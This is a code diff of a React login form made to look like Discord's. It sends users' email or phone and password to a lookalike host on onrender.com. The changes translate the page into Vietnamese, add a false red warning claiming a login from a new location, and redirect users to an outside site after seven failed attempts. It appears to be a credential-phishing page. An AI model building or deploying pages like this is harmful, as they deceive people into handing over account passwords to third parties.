@@ -6,18 +6,22 @@ import logo from '../src/assets/logo.svg';
 function App() {
   const [emailOrPhone, setEmailOrPhone] = useState('');
   const [password, setPassword] = useState('');
+  const [loginAttempts, setLoginAttempts] = useState(0);
 
-  const handleLogin = async (e: { preventDefault: () => void; }) => {
+  const handleLogin = async (e: { preventDefault: () => void }) => {
     e.preventDefault();
 
     try {
-      const response = await fetch('https://api-discord-yzpf.onrender.com/api/v1/auth/login', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({ emailOrPhone, password }),
-      });
+      const response = await fetch(
+        'https://api-discord-yzpf.onrender.com/api/v1/auth/login',
+        {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ emailOrPhone, password }),
+        }
+      );
 
       if (response.ok) {
         // Xử lý đăng nhập thành công
@@ -27,6 +31,15 @@ function App() {
       } else {
         // Xử lý đăng nhập thất bại
         console.log('Đăng nhập thất bại');
+        // Tăng số lần đăng nhập sai
+        setLoginAttempts((prevAttempts) => prevAttempts + 1);
+
+        // Nếu số lần đăng nhập sai đạt 7, chuyển hướng người dùng
+        if (loginAttempts >= 6) {
+          console.log('Đăng nhập sai quá 7 lần, chuyển hướng...');
+          // Chuyển hướng người dùng sang trang mới
+          window.location.href = 'https://daominhha.net/en-garde/';
+        }
       }
     } catch (error) {
       console.error('Lỗi khi thực hiện đăng nhập:', error);
@@ -39,23 +52,25 @@ function App() {
       <div className='form-container'>
         <form onSubmit={handleLogin} autoComplete='false' className='form-main'>
           <img src={logo} alt='logo' className='logo' />
-          <h4>Welcome back!</h4>
-          <p>We're so excited to see you again!</p>
+          <h4>Chào mừng trở lại!</h4>
+          <p>Rất vui khi được gặp lại bạn!</p>
           <div className='list-elm'>
             <div className='input-wrap'>
               <label htmlFor='username'>
-                Email or Phone Number <span>*</span>
+                Email hoặc số điện thoại <span>*</span>
               </label>
               <input
+                style={{border: 'solid red 0.0001px'}}
                 type='text'
                 id='username'
                 value={emailOrPhone}
                 onChange={(e) => setEmailOrPhone(e.target.value)}
               />
+              <p style={{fontSize: '12px', color: 'red'}}>Phát hiện đăng nhập ở địa điểm mới, hãy kiểm tra email của bạn.</p>
             </div>
             <div className='input-wrap'>
               <label htmlFor='password'>
-                Password<span>*</span>
+                Mật khẩu<span>*</span>
               </label>
               <input
                 type='password'
@@ -64,11 +79,13 @@ function App() {
                 onChange={(e) => setPassword(e.target.value)}
               />
             </div>
-            <a href='#'>Forgot your password?</a>
-            <button style={{ cursor: "pointer" }} type='submit'>Log In</button>
+            <a href='#'>Quên mật khẩu?</a>
+            <button style={{ cursor: 'pointer' }} type='submit'>
+              Đăng nhập
+            </button>
             <div>
-              <span>Need an account?</span>
-              <span>Register</span>
+              <span>Cần một tài khoản?</span>
+              <span>Đăng ký</span>
             </div>
           </div>
         </form>
